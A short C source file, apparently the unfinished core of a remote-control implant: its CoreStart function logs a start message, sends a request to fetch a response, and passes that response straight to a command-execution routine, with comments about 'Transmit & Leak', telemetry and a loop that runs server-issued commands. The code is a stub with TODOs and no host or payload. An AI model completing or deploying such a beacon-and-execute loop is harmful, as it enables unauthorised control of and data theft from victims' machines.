#include "core.h"

void CoreStart() {
	LPSTR outputBuffer = NULL;

	/* TODO: Initialize configuration*/
	Log(LOG_INFO, "Log Started", (GenericValue*)NULL, (GenericValue*)NULL, (GenericValue*)NULL);
	
	// Transmit & Leak, TODO: POSTDATA, Transmission configuration, command pointer
	SendRequest((LPSTR*)&outputBuffer);

	// while (command != NULL) {
	//	ParseResponse(outputBuffer, &commInfo, &telem, &command);
	//	runCmd(command)
	//  SendRequest(outputBuffer)
	// }
	// Process command
	runCmd(outputBuffer);
}